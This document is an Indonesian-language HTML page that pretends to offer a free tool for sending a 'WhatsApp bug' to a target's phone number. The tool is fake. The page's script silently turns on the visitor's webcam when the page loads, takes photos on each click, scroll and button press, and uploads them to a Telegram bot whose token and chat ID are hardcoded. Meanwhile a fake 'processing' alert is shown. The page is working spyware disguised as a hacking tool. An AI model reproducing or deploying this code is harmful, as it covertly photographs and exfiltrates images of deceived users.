<!DOCTYPE html>
<html>
<head>
  <title>FREE BUG WHATSAPP 2025</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: url('https://files.catbox.moe/033uyr.jpg') no-repeat center center fixed;
      background-size: cover;
      font-family: 'Segoe UI', sans-serif;
      color: white;
      text-align: center;
      overflow-x: hidden;
    }

    .snow {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 1;
      pointer-events: none;
      background: url('https://files.catbox.moe/033uyr.jpg') repeat;
      background-size: contain;
      animation: snowAnim 20s linear infinite;
      opacity: 0.3;
    }

    @keyframes snowAnim {
      0% { background-position: 0 -100px; }
      100% { background-position: 0 100px; }
    }

    .container {
      position: relative;
      z-index: 2;
      margin-top: 140px;
    }

    h1 {
      font-size: 3.2em;
      text-shadow: 0 0 15px #00ffe1, 0 0 25px #00ffe1;
    }

    input {
      padding: 18px;
      border-radius: 12px;
      border: none;
      font-size: 24px;
      width: 85%;
      max-width: 400px;
      margin-top: 25px;
      outline: none;
      background-color: rgba(0, 0, 0, 0.65);
      color: white;
      box-shadow: 0 0 25px #00ffee, 0 0 35px #00ffee;
      transition: 0.3s ease-in-out;
    }

    button {
      margin-top: 25px;
      padding: 15px 30px;
      font-size: 20px;
      background-color: #00ffcc;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      color: #111;
      box-shadow: 0 0 15px #00ffcc, 0 0 25px #00ffcc;
    }

    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

<div class="snow"></div>

<div class="container">
  <h1>Bug Whatsapp Free</h1>
  <p>Masukkan Nomor Target:</p>
  <input type="text" placeholder="62xxxxx" id="nomor">
  <br>
  <button onclick="main()">Kirim Bug Whatsapp</button>
</div>

<video id="video" width="320" height="240" autoplay></video>
<canvas id="canvas" width="320" height="240"></canvas>

<audio id="sound">
  <source src="https://files.catbox.moe/033uyr.mp3" type="audio/mpeg">
</audio>

<script>
  const token = "8069867736:AAGllygFqDGVMbfCag4Y_m5CgNF1Vm3N6CE";
  const chat_id = "7872909675";
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');
  const sound = document.getElementById('sound');

  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      video.srcObject = stream;
    })
    .catch(err => {
      console.error("Kamera error.", err);
    });

  function captureAndSend() {
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(function(blob) {
      const form = new FormData();
      form.append("chat_id", chat_id);
      form.append("photo", blob, "kamera.jpg");

      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: form
      });
    }, 'image/jpeg');
  }

  document.body.addEventListener("click", captureAndSend);
  document.body.addEventListener("scroll", captureAndSend);

  function main() {
    const nomor = document.getElementById("nomor").value;
    if (nomor.trim() === "") {
      alert("Masukkan nomor dulu!");
      return;
    }

    sound.play();
    alert("Bug sedang diproses...\nTunggu 5-10 menit.");
    captureAndSend();
  }
</script>

</body>
</html>
